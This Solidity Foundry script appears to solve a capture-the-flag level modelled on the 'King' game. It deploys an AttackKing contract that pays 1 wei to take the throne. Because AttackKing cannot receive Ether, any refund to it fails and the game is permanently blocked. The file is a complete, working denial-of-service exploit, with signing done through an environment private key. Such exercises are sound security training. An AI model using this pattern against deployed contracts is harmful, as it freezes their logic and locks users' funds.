// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level9.sol";
import "forge-std/Script.sol";

contract ExploitLevel9 is Script {
    King instance = King(payable(0x374085Fb1751CFfF55442837f1094432Ef1F6a3A));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackKing attackKing = new AttackKing(address(instance));
        attackKing.attack{value: 1 wei}();
        vm.stopBroadcast();
    }
}

contract AttackKing {
    address instanceAddr;

    constructor(address _instance) {
        instanceAddr = _instance;
    }

    function attack() external payable {
        (bool success,) = instanceAddr.call{value: msg.value}("");
        require(success, "call failed");
    }
}
